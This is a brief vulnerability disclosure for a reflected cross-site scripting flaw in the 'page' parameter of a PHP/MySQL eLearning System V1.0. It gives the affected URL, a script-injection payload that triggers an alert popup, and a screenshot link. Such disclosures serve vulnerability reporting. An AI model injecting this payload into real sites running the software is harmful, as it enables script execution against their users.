# eLearning System – reflected XSS on (faculty/?page=XX) 
# Vendor Homepage:
https://www.sourcecodester.com/php/14787/elearning-system-using-phpmysqli-source-code.html 
Version:V1.0
Tested on: PHP, Apache, MySQL
# Affected Page:
faculty/?page=XX 
On this page,page parameter is vulnerable to reflected XSS Attack 
# Proof of vulnerability:
Visit this page：http://localhost/elearning/faculty/?page=student
# Payload：
</script><script>alert(1)</script>
# Trigger popup：
<img width="416" alt="image" src="https://github.com/qqqyc/vuln/assets/53200267/d6ee0783-b6fc-4ecd-9318-666437a41477">
